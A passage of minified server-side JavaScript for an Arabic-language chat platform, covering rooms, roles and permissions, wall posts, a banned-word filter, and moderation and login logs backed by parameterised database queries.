                r.id != e || r.default || (r.usersCount() > 0 && !t ? r.removeWhenEmpty = !0 : (this.rooms = this.rooms.filter(t => t.id != e), s = !0))
            }), s ? e : 0
        }
        return 0
    }, e.exports = o
}, function(e, t, s) {
    const r = s(2),
        i = s(7),
        o = s(1);

    function n(e, t) {
        this.settings = t, this.id = e.id, this.name = e.name, this.is_voice_room = e.is_voice_room, this.password = e.password || null, this.required_likes = e.required_likes || 0, this.welcome = e.welcome || null, this.description = e.description || null, this.default = !!e.default, this.capacity = "number" == typeof e.capacity ? e.capacity : 50, this.flag = e.flag || null, this.target = e.target || "all", this.users = this.users || [], this.micUsers = [], this.ludoGameState = {}
    }
    n.prototype.usersCount = function() {
        return this.users.length
    }, n.prototype.isFull = function(e, t) {
        return e && t ? this.filterUsers(e, t).length >= this.capacity : this.users.length >= this.capacity
    }, n.prototype.getFlag = function() {
        const e = this.settings.getDefaultRoomsFlag();
        return this.flag ? r.existsSync(i.join("public", "uploads", "rooms", this.flag)) ? "/uploads/rooms/" + this.flag : (this.flag = null, e) : e
    }, n.prototype.parse = function(e, t) {
        return {
            id: this.id,
            name: this.name,
            is_voice_room: this.is_voice_room,
            password: !!this.password,
            required_likes: this.required_likes,
            welcome: this.welcome,
            description: this.description,
            capacity: this.capacity,
            micUsers: this.micUsers,
            ludoGameState: this.ludoGameState,
            flag: this.getFlag(),
            users: this.filterUsers(e, t)
        }
    }, n.prototype.filterUsers = function(e, t) {
        return e instanceof o && Array.isArray(t) ? t.filter(t => t.canBeSeenBy(e) && t.room && t.room.id == this.id).map(e => e.id) : this.users
    }, e.exports = n
}, function(e, t) {
    function s(e) {
        this.db = e.db, this.init().catch(e => {}), this.baseDir = "/uploads/gifts/", this.gifts = []
    }
    s.prototype.init = function() {
        var e = this;
        return new Promise((function(t, s) {
            e.db.query("SELECT * FROM gifts", [], (function(r, i) {
                try {
                    if (!r && i && i.length) {
                        for (var o in e.gifts = [], i) {
                            var n = i[o];
                            e.gifts.push({
                                id: n.id,
                                icon: e.baseDir + n.icon
                            })
                        }
                        t(e.gifts)
                    } else s("no gifts found")
                } catch (e) {
                    s(e)
                }
            }))
        }))
    }, s.prototype.all = function() {
        return this.gifts
    }, e.exports = s
}, function(e, t) {
    function s(e) {
        this.db = e.db, this.init().catch(e => {}), this.faces = []
    }
    s.prototype.init = function() {
        var e = this;
        return new Promise((function(t, s) {
            e.db.query("SELECT * FROM faces", [], (function(r, i) {
                try {
                    if (!r && i && i.length) {
                        for (var o in e.faces = [], i) {
                            var n = i[o];
                            e.faces.push({
                                id: n.id,
                                icon: n.icon,
                                key: n.key
                            })
                        }
                        t(e.faces)
                    } else s("no faces found")
                } catch (e) {
                    s(e)
                }
            }))
        }))
    }, s.prototype.all = function() {
        return this.faces
    }, e.exports = s
}, function(e, t) {
    function s(e) {
        this.db = e.db, this.init().catch(e => {}), this.backgrounds = []
    }
    s.prototype.init = function() {
        var e = this;
        return new Promise((function(t, s) {
            e.db.query("SELECT * FROM user_backgrounds", [], (function(r, i) {
                try {
                    if (!r && i && i.length) {
                        for (var o in e.backgrounds = [], i) {
                            const t = i[o];
                            e.backgrounds.push({
                                id: t.id,
                                img: t.img
                            })
                        }
                        t(e.backgrounds)
                    } else s("no backgrounds found")
                } catch (e) {
                    s(e)
                }
            }))
        }))
    }, s.prototype.all = function() {
        return this.backgrounds
    }, s.prototype.find = function(e) {
        return this.backgrounds.find(t => t.id == e)
    }, e.exports = s
}, function(e, t) {
    function s(e) {
        this.db = e.db, this.init().catch(e => {}), this.backgrounds = []
    }
    s.prototype.init = function() {
        var e = this;
        return new Promise((function(t, s) {
            e.db.query("SELECT * FROM user_avatar_backgrounds", [], (function(r, i) {
                try {
                    if (!r && i && i.length) {
                        for (var o in e.backgrounds = [], i) {
                            const t = i[o];
                            e.backgrounds.push({
                                id: t.id,
                                img: t.img
                            })
                        }
                        t(e.backgrounds)
                    } else s("no backgrounds found")
                } catch (e) {
                    s(e)
                }
            }))
        }))
    }, s.prototype.all = function() {
        return this.backgrounds
    }, s.prototype.find = function(e) {
        return this.backgrounds.find(t => t.id == e)
    }, e.exports = s
}, function(e, t, s) {
    const r = s(0);

    function i(e) {
        this.db = e.db, this.roles = [], this.init().catch(e => {})
    }
    i.prototype.init = function() {
        var e = this;
        return new Promise((t, s) => {
            e.roles = [], e.db.query("SELECT * FROM roles", [], (function(r, i) {
                try {
                    if (r && s(r), i && i.length) {
                        for (var o in i) e.roles.push({
                            id: i[o].id,
                            name: i[o].name,
                            icon: i[o].icon,
                            power: i[o].power,
                            type: i[o].type
                        });
                        t(e.roles)
                    }
                } catch (e) {
                    s(e)
                }
            }))
        })
    }, i.prototype.all = function(e) {
        return e ? this.roles.filter(t => e.indexOf(t.id + "") >= 0).sort((function(e, t) {
            return t.power - e.power
        })) : this.roles.sort((function(e, t) {
            return t.power - e.power
        }))
    }, i.prototype.isSuper = function(e) {
        try {
            return !!e && this.getRoleIdByType("basic") != e && this.getRoleIdByType("guest") != e
        } catch (e) {
            return console.log(e.stack), !1
        }
    }, i.prototype.isGuest = function(e) {
        try {
            return !e || this.getRoleIdByType("guest") == e
        } catch (e) {
            return console.log(e.stack), !0
        }
    }, i.prototype.isBasic = function(e) {
        try {
            return this.getRoleIdByType("basic") == e
        } catch (e) {
            return console.log(e.stack), !1
        }
    }, i.prototype.isOwner = function(e) {
        try {
            return this.getRoleIdByType("owner") == e
        } catch (e) {
            return console.log(e.stack), !1
        }
    }, i.prototype.getRoleName = function(e) {
        try {
            if (!e) return "زائر";
            const t = this.roles.filter(t => t.id == e)[0];
            return t ? t.name : "زائر"
        } catch (e) {
            return null
        }
    }, i.prototype.getRoleIdByType = function(e) {
        const t = this.roles.filter(t => t.type == e)[0];
        return t ? t.id : null
    }, i.prototype.getIcon = function(e) {
        try {
            const t = this.roles.filter(t => t.id == e)[0];
            return t && t.icon ? t.icon : null
        } catch (e) {
            return null
        }
    }, i.prototype.changeIcon = function(e, t) {
        if (!e && r.isXSS(t)) return;
        const s = this.roles.filter(t => t.id == e)[0];
        return s ? (s.icon = t, !0) : void 0
    }, i.prototype.removeIcon = function(e) {
        if (!e) return;
        const t = this.roles.filter(t => t.id == e)[0];
        return t ? (t.icon = null, !0) : void 0
    }, i.prototype.getAsteriskFromRole = function(e, t) {
        return t ? '<img width="16px" height="16px" src="' + t + '"  />' : this.getIcon(e, 18, 18)
    }, e.exports = i
}, function(e, t, s) {
    const r = s(0),
        i = (s(3), s(1));

    function o(e) {
        this.store = e, this.baseDir = "/uploads/wall/"
    }
    o.prototype.all = function(e) {
        var t = this;
        return e = isNaN(parseInt(e)) ? 35 : parseInt(e), new Promise((function(s, i) {
            t.store.db.query("SELECT (SELECT COUNT(*) FROM wall_comments WHERE (post_id = wall.id)) AS comments_count, wall.*, users.name as user_name, users.avatar as user_avatar, users.decoration as user_decoration, users.gift as user_gift, users.fontColor as user_fontColor, users.nameColor as user_nameColor, users.nameBgColor as user_nameBgColor, users.role_id as user_role FROM wall JOIN users ON wall.user_id = users.id ORDER BY wall.created_at DESC LIMIT ?", [e], (function(e, o) {
                try {
                    e && i(e);
                    const u = [];
                    if (o && o.length)
                        for (var n in o) {
                            var a = o[n];
                            u.push({
                                id: a.id,
                                body: "text" == a.type ? r.sanitize(a.body, t.store.shortcuts) : a.body,
                                type: a.type,
                                likes: a.likes,
                                comments: a.comments_count,
                                time: new Date(a.created_at).getTime(),
                                user: t.parseUser(a)
                            })
                        }
                    s(u)
                } catch (e) {
                    i(e)
                }
            }))
        }))
    }, o.prototype.getPostComments = function(e, t) {
        var s = this;
        return t = isNaN(parseInt(t)) ? 100 : parseInt(t), new Promise((function(i, o) {
            s.store.db.query("SELECT wall_comments.*, (SELECT user_id FROM wall WHERE (post_id = wall.id)) AS post_owner_id, users.name as user_name, users.avatar as user_avatar, users.decoration as user_decoration, users.gift as user_gift, users.fontColor as user_fontColor, users.nameColor as user_nameColor, users.nameBgColor as user_nameBgColor, users.role_id as user_role FROM wall_comments JOIN users ON wall_comments.user_id = users.id WHERE post_id = ? ORDER BY wall_comments.created_at ASC LIMIT ?", [e, t], (function(e, t) {
                try {
                    e && o(e);
                    const u = [];
                    if (t && t.length)
                        for (var n in t) {
                            var a = t[n];
                            u.push({
                                id: a.id,
                                postId: a.post_id,
                                comment: r.sanitize(a.comment, s.store.shortcuts),
                                likes: a.likes,
                                postOwnerId: a.post_owner_id,
                                time: new Date(a.created_at).getTime(),
                                user: s.parseUser(a)
                            })
                        }
                    i(u)
                } catch (e) {
                    o(e)
                }
            }))
        }))
    }, o.prototype.parseUser = function(e) {
        let t = this.store.users.filter(t => t.reg_id == e.user_id)[0];
        return t ? t.parse() : ((t = new i(null, this.store)).init({
            id: e.user_id,
            name: e.user_name,
            decoration: e.user_decoration,
            avatar: e.user_avatar,
            role: e.user_role,
            gift: e.user_gift,
            fontColor: e.user_fontColor,
            nameColor: e.user_nameColor,
            nameBgColor: e.user_nameBgColor
        }), t.room = null, t = t.parse())
    }, o.prototype.like = function(e) {
        const t = this;
        return new Promise((s, r) => {
            t.store.db.query("SELECT id, user_id, likes FROM wall WHERE id = ?", [e], (function(e, i) {
                try {
                    if (e && r(e), i && i.length) {
                        const e = i[0].id,
                            o = i[0].user_id,
                            n = ++i[0].likes;
                        t.store.db.query("UPDATE wall SET likes = ? WHERE id = ?", [n, e], (function(t, i) {
                            try {
                                t && r(t), i && i.affectedRows ? s({
                                    postId: e,
                                    userId: o,
                                    likes: n
                                }) : r("error saving post like")
                            } catch (e) {
                                r(e)
                            }
                        }))
                    } else r("post not found")
                } catch (e) {
                    r(e)
                }
            }))
        })
    }, o.prototype.likeComment = function(e) {
        const t = this;
        return new Promise((s, i) => {
            t.store.db.query("SELECT * FROM wall_comments WHERE id = ?", [e], (function(e, o) {
                try {
                    if (e && i(e), o && o.length) {
                        const e = o[0].id,
                            n = o[0].comment,
                            a = o[0].user_id,
                            u = ++o[0].likes;
                        t.store.db.query("UPDATE wall_comments SET likes = ? WHERE id = ?", [u, e], (function(o, c) {
                            try {
                                o && i(o), c && c.affectedRows ? s({
                                    commentId: e,
                                    userId: a,
                                    likes: u,
                                    comment: r.sanitize(n, t.store.shortcuts)
                                }) : i("error saving post like")
                            } catch (e) {
                                i(e)
                            }
                        }))
                    } else i("post not found")
                } catch (e) {
                    i(e)
                }
            }))
        })
    }, o.prototype.remove = function(e) {
        const t = this;
        return new Promise((s, r) => {
            t.store.db.query("SELECT * FROM wall WHERE id = ?", [e], (function(i, o) {
                try {
                    if (i && r(i), o && o.length) {
                        const i = o[0].id,
                            n = o[0].user_id,
                            a = o[0].body,
                            u = o[0].type;
                        t.store.db.query("DELETE FROM wall WHERE id = ?", [e], (function(e, t) {
                            try {
                                e && r(e), t && t.affectedRows ? s({
                                    postId: i,
                                    userId: n,
                                    body: a,
                                    type: u
                                }) : r("error deleting post")
                            } catch (e) {
                                r(e)
                            }
                        }))
                    } else r("post not found")
                } catch (e) {
                    r(e)
                }
            }))
        })
    }, o.prototype.removeComment = function(e, t) {
        const s = this;
        return new Promise((r, i) => {
            s.store.db.query("DELETE FROM wall_comments WHERE id = ?", [e], (function(s, o) {
                try {
                    s && i(s), o && o.affectedRows ? r({
                        commentId: e,
                        postId: t
                    }) : i("error deleting comment")
                } catch (e) {
                    i(e)
                }
            }))
        })
    }, o.prototype.add = function(e, t) {
        const s = this;
        return new Promise((i, o) => {
            t || o("user id is null");
            const n = new Date;
            s.store.db.query("INSERT INTO wall (type, body, user_id, upload_hash, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?)", [e.type, e.body, t, null, n, n], (t, a) => {
                try {
                    t && o(t), a && a.affectedRows ? i({
                        id: a.insertId,
                        type: e.type,
                        body: "text" == e.type ? r.sanitize(e.body, s.store.shortcuts) : e.body,
                        likes: 0,
                        comments: 0,
                        time: n.getTime()
                    }) : o("post not added")
                } catch (e) {
                    o(e)
                }
            })
        })
    }, o.prototype.addComment = function(e, t) {
        const s = this;
        return new Promise((i, o) => {
            t || o("user id is null");
            const n = new Date;
            s.store.db.query("INSERT INTO wall_comments (comment, user_id, post_id, created_at, updated_at) VALUES (?, ?, ?, ?, ?)", [e.text, t, e.post_id, n, n], (a, u) => {
                try {
                    a && o(a), u && u.affectedRows ? s.store.db.query("SELECT * FROM wall WHERE id = ? LIMIT 1", [e.post_id], (function(a, c) {
                        if (a && o(a), c && c.length) {
                            const o = c[0].user_id;
                            i({
                                id: u.insertId,
                                comment: r.sanitize(e.text, s.store.shortcuts),
                                likes: 0,
                                postOwnerId: o,
                                userId: t,
                                postId: e.post_id,
                                time: n.getTime()
                            })
                        }
                    })) : o("post comment not added")
                } catch (e) {
                    o(e)
                }
            })
        })
    }, o.prototype.removeOlderPosts = function(e) {
        const t = this;
        return new Promise((s, r) => {
            e || r("no count"), t.store.db.query("DELETE FROM wall WHERE id NOT IN ( SELECT id FROM ( SELECT id FROM wall ORDER BY id DESC LIMIT ? ) foo )", [e], (e, t) => {
                e && r(e), s(t)
            })
        })
    }, o.prototype.getCreatorPosts = function() {
        const e = this;
        return new Promise((t, s) => {
            e.store.db.query("SELECT * FROM users WHERE wall_points > 0 ORDER BY wall_points DESC LIMIT 10;", [], (e, r) => {
                e && s(e), t(r)
            })
        })
    }, o.prototype.get = function(e) {
        const t = this;
        return new Promise((s, r) => {
            e || r("post id is null"), t.store.db.query("SELECT user_id FROM wall WHERE id = ? LIMIT 1", [e], (e, t) => {
                try {
                    e && r(e), t ? s(t[0].user_id) : r("post not found")
                } catch (e) {
                    r(e)
                }
            })
        })
    }, e.exports = o
}, function(e, t, s) {
    var r = s(0);

    function i(e) {
        this.db = e.db, this.roles = e.roles, this.data = {}, this.rolePowers = {}, this.init()
    }
    i.prototype.init = function() {
        this.setPermissions(), this.setRolePwers()
    }, i.prototype.getRadioSpeakTime = function(e) {
        try {
            return e ? this.data[e].radio_speak_time : 0
        } catch (e) {
            return console.log(e.stack), 0
        }
    }, i.prototype.setPermissions = function() {
        try {
            var e = this;
            this.data = {}, this.db.query("SELECT * FROM permissions", [], (function(t, s) {
                try {
                    if (!t && s && s.length)
                        for (var r in s) e.setRoleData(s[r])
                } catch (e) {
                    console.log(e.stack)
                }
            }))
        } catch (e) {
            console.log(e.stack)
        }
    }, i.prototype.setRolePwers = function() {
        try {
            var e = this;
            this.rolePowers = {}, this.db.query("SELECT * FROM roles", [], (function(t, s) {
                try {
                    if (!t && s && s.length)
                        for (var r in s) {
                            var i = s[r];
                            e.rolePowers[i.id] = i.power
                        }
                } catch (e) {
                    console.log(e.stack)
                }
            }))
        } catch (e) {
            console.log(e.stack)
        }
    }, i.prototype.resetRoles = function() {
        this.roles.init().then(() => {
            this.init()
        }).catch(e => {})
    }, i.prototype.isAutorized = function(e, t, s) {
        try {
            if (!t) return !1;
            var i = "boolean" == typeof this.data[t][e] || "number" == typeof this.data[t][e];
            if (i && t == this.roles.getRoleIdByType("owner")) return !0;
            if (i) return !!this.data[t][e];
            if (t == this.roles.getRoleIdByType("owner")) return {
                isAutorized: !0,
                times: []
            };
            var o = this.data[t][e].split("|")[0];
            if (!o || 0 == o) return !1;
            var n = 1;
            return "hour" == this.data[t][e].split("|")[1] && (n = 60), "day" == this.data[t][e].split("|")[1] && (n = 1440), "month" == this.data[t][e].split("|")[1] && (n = 43200), s = this.updateArrayTimes(s, n), 1 == n && (n = "الدقيقة"), 60 == n && (n = "الساعة"), 1440 == n && (n = "اليوم"), 43200 == n && (n = "الشهر"), r.arrayCount(s) < this.data[t][e].split("|")[0] ? {
                isAutorized: !0,
                times: s
            } : {
                isAutorized: !1,
                interval: o,
                unit: n
            }
        } catch (e) {
            return console.log(e.stack), !1
        }
    }, i.prototype.updateArrayTimes = function(e, t) {
        try {
            t < 1 && (t = 1);
            var s = Date.now();
            for (var r in e) s > e[r] + 60 * t * 1e3 && delete e[r];
            return e
        } catch (e) {
            console.log(e.stack)
        }
    }, i.prototype.updateRole = function(e) {
        try {
            var t = this;
            this.db.query("SELECT * FROM permissions WHERE role_id = ? LIMIT 1", [e], (function(e, s) {
                try {
                    !e && s && s.length && (t.setRoleData(s[0]), t.setRolePwers())
                } catch (e) {
                    console.log(e.stack)
                }
            }))
        } catch (e) {
            console.log(e.stack)
        }
    }, i.prototype.setRoleData = function(e) {
        try {
            if (!e) return;
            var t = {};
            t.orders_excpel = e.orders_excpel, t.orders_ban = e.orders_ban, t.orders_notify = e.orders_notify, t.orders_gift = e.orders_gift, t.orders_remove_avatar = e.orders_remove_avatar, t.orders_change_decoartion = e.orders_change_decoartion, t.orders_excpel_from_room = e.orders_excpel_from_room, t.orders_upgrade = e.orders_upgrade, t.orders_upgrade_roles = e.orders_upgrade_roles, t.room_create = e.room_create, t.room_edit = e.room_edit, t.room_remove = e.room_remove, t.room_max_pertinents = e.room_max_pertinents, t.send_ad = e.send_ad, t.wall_remove = e.wall_remove, t.wall_interval = e.wall_interval, t.wall_likes = e.wall_likes, t.private_likes = e.private_likes, t.hidden = e.hidden, t.can_see_hidden = e.can_see_hidden, t.edit_permissions = e.edit_permissions, t.reveal_names = e.reveal_names, t.open_private = e.open_private, t.open_full_rooms = e.open_full_rooms, t.open_locked_rooms = e.open_locked_rooms, t.public_msg_remove = e.public_msg_remove, t.album_length = e.album_length, t.radio_speak_time = e.radio_speak_time, t.stop_radio = e.stop_radio, t.orders_change_room = e.orders_change_room, t.show_real_name = e.show_real_name, t.change_btns_bg = e.change_btns_bg, t.show_ip = e.show_ip, t.user_backgrounds = e.user_backgrounds, t.like_controls = e.like_controls, t.wall_banner = e.wall_banner, t.youcam_ludo = e.youcam_ludo, t.bot_brb = e.bot_brb, t.admin_login_banneds = e.admin_login_banneds, t.admin_filter_nofications = e.admin_filter_nofications, t.admin = e.admin, t.admin_events = e.admin_events, t.admin_reg = e.admin_reg, t.admin_users = e.admin_users, t.admin_users_remove = e.admin_users_remove, t.admin_users_edit = e.admin_users_edit, t.admin_banneds = e.admin_banneds, t.admin_banneds_remove = e.admin_banneds_remove, t.admin_mute = e.admin_mute, t.admin_rooms = e.admin_rooms, t.admin_rooms_edit = e.admin_rooms_edit, t.admin_rooms_remove = e.admin_rooms_remove, t.admin_supers = e.admin_supers, t.admin_supers_remove = e.admin_supers_remove, t.admin_settings = e.admin_settings, this.data[e.role_id] = t
        } catch (e) {
            console.log(e.stack)
        }
    }, i.prototype.getUpgradableRoles = function(e) {
        return this.data[e].orders_upgrade_roles ? this.data[e].orders_upgrade_roles.split(",").filter(e => null != e && "" != e && null != e) : []
    }, i.prototype.isGreaterThan = function(e, t) {
        try {
            if (!e) return !1;
            var s = this.rolePowers[t] || 0;
            return parseInt(this.rolePowers[e]) > parseInt(s)
        } catch (e) {
            return console.log(e.stack), !1
        }
    }, i.prototype.isGreaterThanOrEqual = function(e, t) {
        try {
            if (!e) return !1;
            var s = this.rolePowers[t] || 0;
            return this.rolePowers[e] >= s
        } catch (e) {
            return console.log(e.stack), !1
        }
    }, i.prototype.getTopRoles = function(e) {
        try {
            var t = this;
            e || (e = 1);
            var s = Object.keys(this.rolePowers).sort((function(e, s) {
                return t.rolePowers[s] - t.rolePowers[e]
            }));
            for (var r in s = s.slice(0, e)) s[r] = parseInt(s[r]);
            return s
        } catch (e) {
            return console.log(e.stack), []
        }
    }, i.prototype.canUpgrade = function(e, t) {
        try {
            var s = !1;
            return this.data[e.role].orders_upgrade && this.data[e.role].orders_upgrade_roles.split(",").includes(t) && (s = !0), s
        } catch (e) {
            return console.log(e.stack), !1
        }
    }, i.prototype.hiddenSeenBy = function(e, t) {
        try {
            return !(e.role || !t.role) || !(e.role && !t.role) && !!this.data[e.role] && this.data[e.role].can_see_hidden.split(",").indexOf("" + t.role) >= 0
        } catch (e) {
            return console.log(e.stack), !1
        }
    }, i.prototype.parseUserRole = function(e, t) {
        try {
            return parseInt(this.rolePowers[e]) || 0
        } catch (e) {
            return console.log(e.stack), 0
        }
    }, e.exports = i
}, function(e, t) {
    function s(e) {
        this.db = e.db
    }
    s.prototype.get = function(e) {
        var t = this;
        return new Promise((function(s, r) {
            t.db.query("SELECT * FROM reveal_names WHERE username = ? OR ip = ? ORDER BY updated_at DESC", [e.name, e.ip], (function(e, t) {
                try {
                    if (e) r(e);
                    else {
                        var i = [];
                        for (var o in t) {
                            var n = t[o];
                            i.push({
                                id: n.id,
                                username: n.username,
                                decoration: n.decoration ? n.decoration : n.username,
                                country: n.country ? n.country.toLowerCase() : "undef",
                                ip: n.ip,
                                device: n.device,
                                created_at: n.created_at
                            })
                        }
                        s(i)
                    }
                } catch (e) {
                    r(e)
                }
            }))
        }))
    }, s.prototype.register = function(e) {
        var t = this;
        return new Promise((function(s, r) {
            const i = new Date;
            t.db.query("INSERT INTO reveal_names (username, role, ip, device, device_uuid, decoration, country, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)", [e.name, e.role, e.ip, e.device, e.deviceUUID, e.decoration, e.country, i, i], (function(e, t) {
                e && r(e)
            }))
        }))
    }, s.prototype.registerIfNotExists = function(e) {
        var t = this;
        return new Promise((function(s, r) {
            t.db.query("SELECT * FROM reveal_names WHERE device_uuid = ? AND username = ? AND role = ?", [e.deviceUUID, e.name, e.role], (function(s, i) {
                try {
                    if (s) r(s);
                    else {
                        const s = new Date;
                        i && i.length ? t.db.query("UPDATE reveal_names SET updated_at = ? WHERE device_uuid = ? AND username = ? AND role = ?", [s, e.deviceUUID, e.name, e.role], (function(e, t) {})) : t.db.query("INSERT INTO reveal_names (username, role, ip, device, device_uuid, decoration, country, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)", [e.name, e.role, e.ip, e.device, e.deviceUUID, e.decoration, e.country, s, s], (function(e, t) {}))
                    }
                } catch (e) {
                    r(e)
                }
            }))
        }))
    }, e.exports = s
}, function(e, t, s) {
    const r = s(0),
        i = s(12);

    function o(e) {
        this.store = e, this.db = e.db
    }
    o.prototype.register = function(e, t) {
        var s = this;
        return this.notifyAdmins(e, t), new Promise((function(r, i) {
            s.db.query("SELECT * FROM login_banneds WHERE device_uuid = ? AND username = ? AND `type` = ?", [e.deviceUUID, e.name, t], (function(r, o) {
                try {
                    if (r) i(r);
                    else {
                        const r = new Date;
                        o && o.length ? s.db.query("UPDATE login_banneds SET updated_at = ? WHERE device_uuid = ? AND username = ? AND `type` = ?", [r, e.deviceUUID, e.name, t], (function(e, t) {})) : s.db.query("INSERT INTO login_banneds (`type`, username, user_id, role, ip, device, device_uuid, country, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", [t, e.name, e.reg_id, e.role, e.ip, e.device, e.deviceUUID, e.country, r, r], (function(e, t) {}))
                    }
                } catch (e) {
                    i(e)
                }
            }))
        }))
    }, o.prototype.notifyAdmins = function(e) {
        let t = this.store.users.filter(e => e.isOwner() || e.has("admin_login_banneds")),
            s = this.store.roles.getRoleName(e.role);
        e.decoration = e.decoration ? e.decoration : "";
        let o = {
                user_id: e.reg_id,
                name: e.name,
                decoration: e.decoration,
                ip: e.ip,
                device: e.device,
                country: e.country,
                role: s,
                isGuest: e.isGuest()
            },
            n = i.createHash("md5").update(JSON.stringify(o)).digest("hex");
        t.forEach(e => {
            e.socket && e.hashedLoginBnneds.indexOf(n) < 0 && (e.socket.emit("res", r.enc({
                type: "LOGIN_BANNED",
                data: o
            })), e.hashedLoginBnneds.push(n))
        })
    }, e.exports = o
}, function(e, t, s) {
    var r = s(5),
        i = s(0);

    function o(e) {
        this.db = e.db, this.store = e, this.words = [], this.init().catch(e => {})
    }
    o.prototype.init = function() {
        var e = this;
        return new Promise((function(t, s) {
            e.db.query("SELECT * FROM words", [], (function(r, i) {
                for (var o in e.words = [], r && s(r), i) e.words.push(i[o]);
                t(e.words)
            }))
        }))
    }, o.prototype.addWord = function(e) {
        return e && e.id && e.word && e.type ? this.words.filter(t => t.id == e.id)[0] ? null : (this.words.push(e), e) : null
    }, o.prototype.updateWord = function(e) {
        if (!(e && e.id && e.word && e.type)) return !1;
        const t = this.words.filter(t => t.id == e.id)[0];
        return !!t && (t.type = e.type, t.is_notification_enabled = e.is_notification_enabled, !0)
    }, o.prototype.removeWord = function(e) {
        return !!e && (this.words = this.words.filter(t => t.id != e), !0)
    }, o.prototype.check = function(e, t, s, r) {
        if ("string" == typeof e) {
            if (e = e.substr(0, 200), this.containDeniedWords(e, t) && !t.isOwner()) {
                if (t.deniedWordsCount++, t.deniedWordsCount > 2) t.excpel(null);
                else {
                    const e = r || "هذه الرساله تحتوي على كلمات ممنوعه عند تكرار هذي الكلمه سيتم حظرك من النظام";
                    s(i.enc(e))
                }
                return !0
            }
            return !1
        }
    }, o.prototype.getWordsByType = function(e) {
        return this.words.filter(t => t.type == e)
    }, o.prototype.getDenieds = function() {
        return this.words.filter(e => "denied" == e.type)
    }, o.prototype.getControlleds = function() {
        return this.words.filter(e => "controlled" == e.type)
    }, o.prototype.sanitize = function(e, t) {
        try {
            for (var s in this.getDenieds()) {
                var i = this.getDenieds()[s],
                    o = r.formatForFilter(e),
                    n = r.formatForFilter(i.word);
                if (o.indexOf(n) >= 0) return this.notifyAdmins(i, t, e), {
                    type: "denied",
                    id: i.id,
                    word: i.word
                }
            }
            for (var s in this.getControlleds())
                if (i = this.getControlleds()[s], o = r.formatForFilter(e), n = r.formatForFilter(i.word), o.indexOf(n) >= 0) return this.notifyAdmins(i, t, e), {
                    type: "controlled",
                    id: i.id,
                    word: i.word
                };
            return null
        } catch (e) {
            return "denied"
        }
    }, o.prototype.notifyAdmins = function(e, t, s) {
        e && t && e.is_notification_enabled && this.store.users.filter(e => e.isOwner() || e.has("admin_filter_nofications")).forEach(r => {
            r.socket && (e.text = s, r.socket.emit("res", i.enc({
                type: "FILTER_SEND_NOTIFICATION",
                data: {
                    user: t.parse(),
                    word: e
                }
            })))
        })
    }, o.prototype.registerWord = function(e, t, s, r, i, o) {
        var n = this;
        return "string" == typeof r && (r = r.substr(0, 190)), new Promise((function(a, u) {
            n.db.query("INSERT INTO filtered_words (word, word_id, word_type, full_text, user, ip, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", [e, t, s, r, i, o, new Date, new Date], (function(e, t) {
                e && u(e), a(t)
            }))
        }))
    }, o.prototype.containDeniedWords = function(e, t) {
        try {
            var s = this.sanitize(e, t);
            if (s && "object" == typeof s) {
                if ("denied" == s.type) return t && this.registerWord(s.word, s.id, s.type, e, t.name, t.ip).then().catch(), "denied";
                "controlled" == s.type && t && this.registerWord(s.word, s.id, s.type, e, t.name, t.ip).then().catch()
            }
            return null
        } catch (e) {
            return console.log(e.stack), null
        }
    }, e.exports = o
}, function(e, t) {
    function s(e) {
        this.db = e.db
    }
    s.prototype.changeName = function(e, t) {
        const s = this;
        new Promise((r, i) => {
            const o = "تغيير الإسم إلى " + t.decoration;
            s.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), o, "change-name", new Date, new Date], (function(e, t) {
                e && i(e), r(t)
            }))
        }).catch(e => {})
    }, s.prototype.removeAvatar = function(e, t) {
        const s = this;
        new Promise((r, i) => {
            s.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), "/", "remove-avatar", new Date, new Date], (function(e, t) {
                e && i(e), r(t)
            }))
        }).catch(e => {})
    }, s.prototype.roomExcpel = function(e, t, s) {
        const r = this;
        new Promise((i, o) => {
            const n = s ? "تم طرده من " + s.name : "/";
            r.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), n, "room-excpel", new Date, new Date], (function(e, t) {
                e && o(e), i(t)
            }))
        }).catch(e => {})
    }, s.prototype.excpel = function(e, t) {
        const s = this;
        new Promise((r, i) => {
            s.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), "/", "excpel", new Date, new Date], (function(e, t) {
                e && i(e), r(t)
            }))
        }).catch(e => {})
    }, s.prototype.ban = function(e, t) {
        const s = this;
        new Promise((r, i) => {
            s.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), "/", "ban", new Date, new Date], (function(e, t) {
                e && i(e), r(t)
            }))
        }).catch(e => {})
    }, s.prototype.notify = function(e, t, s) {}, s.prototype.gift = function(e, t) {
        const s = this;
        new Promise((r, i) => {
            const o = t.gift;
            s.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), o, "gift", new Date, new Date], (function(e, t) {
                e && i(e), r(t)
            }))
        }).catch(e => {})
    }, s.prototype.removeGift = function(e, t, s) {
        const r = this;
        new Promise((i, o) => {
            const n = s;
            r.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), n, "remove-gift", new Date, new Date], (function(e, t) {
                e && o(e), i(t)
            }))
        }).catch(e => {})
    }, s.prototype.wallRemove = function(e, t) {
        const s = this;
